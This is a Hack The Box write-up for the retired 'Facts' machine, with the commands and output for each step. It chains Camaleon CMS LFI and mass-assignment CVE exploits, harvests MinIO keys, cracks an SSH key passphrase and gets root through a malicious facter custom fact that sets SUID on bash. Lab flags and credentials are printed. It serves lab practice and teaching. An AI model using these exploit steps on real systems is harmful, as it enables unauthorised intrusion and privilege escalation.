# Facts: Hack The Box Writeup

**Machine:** Facts  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** February 2026  

---

## Summary

Facts is an easy Linux machine running a Camaleon CMS instance backed by a MinIO object storage service. The attack chain starts with registering a user account on the CMS and exploiting an authenticated Local File Inclusion vulnerability (CVE-2024-46987) to read files from the filesystem: including the user flag from another user's home directory. A second Camaleon vulnerability (CVE-2025-2304, mass assignment) escalates the CMS account to administrator, exposing MinIO credentials stored in the admin panel. Those credentials grant access to an internal MinIO bucket containing a backed-up SSH private key. The key passphrase is cracked with John the Ripper, providing SSH access as `trivia`. Privilege escalation to root is achieved by abusing a `sudo` rule allowing `facter` to run as root without a password: a custom malicious fact drops a SUID bit on bash, yielding a root shell.

**Key techniques:** LFI (CVE-2024-46987) · Mass assignment privilege escalation (CVE-2025-2304) · MinIO enumeration · SSH key cracking · Sudo abuse (`facter` custom facts)

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T4 10.129.15.112
```

**Results:**

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp    open  http    nginx 1.26.3: redirects to http://facts.htb/
54321/tcp open  http    Golang net/http server (MinIO)
                        redirects to http://10.129.15.112:9001
```

Three services: SSH, a web application, and MinIO object storage. The HTTP service redirects to `facts.htb`, so we add it to our hosts file:

```bash
sudo vi /etc/hosts
# Add: 10.129.15.112  facts.htb
```

MinIO is a self-hosted S3-compatible object storage service. Port 54321 is the API endpoint; the web console redirect (port 9001) didn't respond: noted for later.

---

## Enumeration

### Web Application: Camaleon CMS

<img width="1890" height="822" alt="Screenshot_2026-03-27_06_59_22" src="https://github.com/user-attachments/assets/3150306c-40eb-437a-80fb-427e886b07e4" />

Navigating to `http://facts.htb` shows a trivia content site built on **Camaleon CMS**. Directory enumeration with Gobuster reveals an admin panel:

```bash
gobuster dir -u http://facts.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Notable results:

```
/admin    (Status: 302) → http://facts.htb/admin/login
/robots.txt
/sitemap.xml
```

Note: many paths returned 200 with identical body sizes (~11110 bytes): this is a Camaleon catch-all, not real files. The `.git`, `.env`, `.ssh` hits in gobuster are all false positives from the catch-all handler.

### Admin Panel: Version Fingerprinting

<img width="1910" height="928" alt="Screenshot_2026-03-27_07_02_50" src="https://github.com/user-attachments/assets/026113ad-5a93-4385-8e0b-5d0ff84b3392" />

Navigating to `/admin/login` reveals a login form. Default credentials (`admin:admin`) don't work, but self-registration is open. Registering an account (`user123 / Password123!`) and logging in exposes the CMS version in the dashboard footer:

```
Copyright © 2015 - 2026 Camaleon CMS. Version 2.9.0
```

Version 2.9.0 is the key detail: two known CVEs affect it.

---

## Initial Access: LFI via CVE-2024-46987

Searching for Camaleon 2.9.0 vulnerabilities surfaces **CVE-2024-46987**, a path traversal / Local File Inclusion vulnerability affecting authenticated users. A public PoC is available:

```bash
git clone https://github.com/Goultarde/CVE-2024-46987
cd CVE-2024-46987
python3 -m venv .venv && source .venv/bin/activate
pip install requests
```

Testing LFI against `/etc/passwd`:

```bash
python3 CVE-2024-46987.py -u http://facts.htb -l user123 -p Password123! /etc/passwd
```

Output reveals two interactive users:

```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001: /home/william:/bin/bash
```

Reading the user flag directly:

```bash
python3 CVE-2024-46987.py -u http://facts.htb -l user123 -p Password123! /home/william/user.txt
# 749927141b38d7555db87e0b71f9fa2e
```

LFI as a regular CMS user is enough to capture the user flag: no admin access required at this stage.

---

## CMS Privilege Escalation: CVE-2025-2304 (Mass Assignment)

To progress further, we need CMS admin access to reach the filesystem configuration. **CVE-2025-2304** is a mass assignment vulnerability in Camaleon < 2.9.1: the user update AJAX endpoint accepts a `role` parameter without authorisation checks, allowing any authenticated user to promote themselves to administrator.

```bash
git clone https://github.com/d3vn0mi/cve-2025-2304-poc
cd cve-2025-2304-poc
python3 -m venv venv && source venv/bin/activate
pip install requests beautifulsoup4
python3 cve-2025-2304.py http://facts.htb -u user123 -p Password123!
```

```
[+] Privilege Escalation: Client → Administrator
[+] Vulnerable Endpoint: /admin/users/5/updated_ajax
[+] Working Payload: {'password[role]': 'admin'}
[+] CVE-2025-2304 CONFIRMED!
```

Logging back in confirms administrator access. The application trusted user-supplied role parameters without any server-side authorisation check: a textbook mass assignment vulnerability (OWASP A01).

---

## Credential Harvesting: MinIO Keys in Admin Panel

With admin access, navigating to **Settings → General Site → Filesystem Settings** reveals S3-compatible storage credentials:

```
AWS S3 Access Key: AKIA605C390525298C36
AWS S3 Secret Key: WfH44q1UJbsU+tWDYNdIjONp4QduMq1j4F31zLxO
```

<img width="1918" height="928" alt="Screenshot_2026-03-27_08_19_26" src="https://github.com/user-attachments/assets/7e1a96e3-952e-4de5-a745-ff57e145399c" />

Given that MinIO is running locally on port 54321, these are MinIO credentials: not real AWS keys. MinIO uses the same access key / secret key format as S3, which is why the CMS treats them as equivalent.

---

## MinIO Enumeration: SSH Key in Internal Bucket

Configuring the MinIO client (`mc`) against the local instance:

```bash
wget https://dl.min.io/client/mc/release/linux-amd64/mc -O ~/mc
chmod +x ~/mc
~/mc alias set facts http://10.129.15.112:54321 AKIA605C390525298C36 "WfH44q1UJbsU+tWDYNdIjONp4QduMq1j4F31zLxO"
~/mc ls facts
```

```
[2025-09-11]  0B internal/
[2025-09-11]  0B randomfacts/
```

Two buckets. `randomfacts` contains the site's image assets. `internal` is more interesting:

```bash
~/mc ls facts/internal
```

```
.bash_logout
.bashrc
.lesshst
.profile
.bundle/
.cache/
.ssh/
```

This is a backup of a user's home directory: the presence of standard dotfiles (`.bashrc`, `.profile`, `.bash_logout`) makes this clear. Listing the `.ssh` directory:

```bash
~/mc ls facts/internal/.ssh
```

```
authorized_keys   82B
id_ed25519       464B
```

An SSH private key is stored in the bucket. Downloading both files:

```bash
~/mc cp facts/internal/.ssh/id_ed25519 ./id_ed25519
~/mc cp facts/internal/.ssh/authorized_keys ./authorized_keys
chmod 600 id_ed25519
cat authorized_keys
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILlrnnmQZnZZGVBL0FiYvQrpG+nDgvX9zUojdE9bR22/
```

The key type matches the server's SSH host key format. The `internal` bucket aligns with `trivia`'s home directory path from `/etc/passwd` (`/home/trivia`).

---

## SSH Key Cracking

Attempting to use the key immediately prompts for a passphrase. Cracking it with John the Ripper:

```bash
ssh2john id_ed25519 > id_ed25519.hash
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
dragonballz      (id_ed25519)
```

---

## Initial Shell: SSH as trivia

```bash
ssh -i id_ed25519 trivia@10.129.15.112
# Passphrase: dragonballz
```

```
trivia@facts:~$
```

Shell obtained as `trivia`.

---

## Privilege Escalation: Sudo facter (Custom Facts)

Checking sudo permissions:

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` is a system facts collection tool (part of the Puppet ecosystem), implemented here as a Ruby script. The key feature for exploitation is the `--custom-dir` flag, which allows loading arbitrary Ruby fact definitions from a specified directory. Since `facter` runs as root via sudo, any Ruby code inside a custom fact executes with root privileges.

Creating a malicious fact that sets the SUID bit on bash:

```bash
mkdir -p /tmp/facts.d
cat > /tmp/facts.d/evil.rb << 'EOF'
Facter.add('shell') do
  setcode do
    `chmod +s /bin/bash`
  end
end
EOF
```

Running it as root:

```bash
sudo facter --custom-dir /tmp/facts.d shell
```

The fact executes silently. Spawning a SUID root shell:

```bash
bash -p
whoami
# root
```

```bash
cat /root/root.txt
# 63b5b6d37e36e05c7d528f924e2a5202
```

---

<img width="1202" height="681" alt="Screenshot 2026-04-28 103605" src="https://github.com/user-attachments/assets/a8d74247-4fb2-408a-9153-ce968a57eb8b" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| LFI / Path traversal (CVE-2024-46987) | Camaleon CMS 2.9.0 (authenticated) | Arbitrary file read as web process: user flag |
| Mass assignment (CVE-2025-2304) | `PUT /admin/users/<id>/updated_ajax` | Any authenticated user can self-escalate to CMS admin |
| Credentials in admin panel | Settings → Filesystem | MinIO access key and secret key exposed to CMS admin |
| SSH private key in object storage | MinIO `internal/.ssh/id_ed25519` | Key recoverable by anyone with MinIO credentials |
| Weak key passphrase | SSH private key | Passphrase cracked in ~4 minutes against rockyou.txt |
| Sudo misconfiguration: facter | `/usr/bin/facter` NOPASSWD | Root code execution via custom Ruby facts |

---

## Key Takeaways

- **Two CVEs chained for access**: CVE-2024-46987 alone is enough for the user flag, but CVE-2025-2304 is the bridge to MinIO credentials and the eventual shell. Neither CVE is critical in isolation; chained, they are
- **Object storage is an attack surface**: MinIO buckets are often treated as internal infrastructure but can expose sensitive files if credentials leak. An SSH private key sitting in a backup bucket is a significant misconfiguration
- **Mass assignment is still widespread**: the application accepted `role=admin` from the user without any server-side check. Always validate role changes server-side regardless of what the client sends
- **sudo + interpreted languages = escalation**: `facter` loads Ruby code at runtime. Any sudo rule granting an interpreted language or a tool that executes code (Ruby, Python, facter, ansible, etc.) without strict argument controls is effectively a root shell
- **Passphrase strength matters**: `dragonballz` falls in under 5 minutes against rockyou.txt. SSH keys protecting privileged access need strong passphrases or should be passphrase-free and protected at the filesystem level instead

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
